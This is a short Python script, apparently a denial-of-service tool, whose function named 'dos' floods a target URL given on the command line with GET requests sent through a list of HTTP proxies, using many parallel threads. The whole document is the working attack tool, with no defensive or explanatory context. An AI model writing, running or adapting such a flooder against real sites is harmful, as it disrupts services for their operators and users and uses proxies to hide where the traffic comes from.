import requests, threading, sys

def dos():
	url = sys.argv[1]
	f = open('httpprox.txt').readlines()
	for prox_addr in f:
		proxy = {"http":f"http://{prox_addr}","https":f"http://{prox_addr}"}
		try:
			r = requests.get(url, proxies=proxy)
			print(f"[{r.status_code}] {url} | {proxy}")
		except:
			print(f"[-Error-] {url} | {proxy} ~")

threadz = []
for i in range(5):
	for i in range(100):
		x = threading.Thread(target=dos)
		x.daemon = True
		threadz.append(x)
	for i in range(100):
		threadz[i].start()
	for i in range(100):
		threadz[i].join()
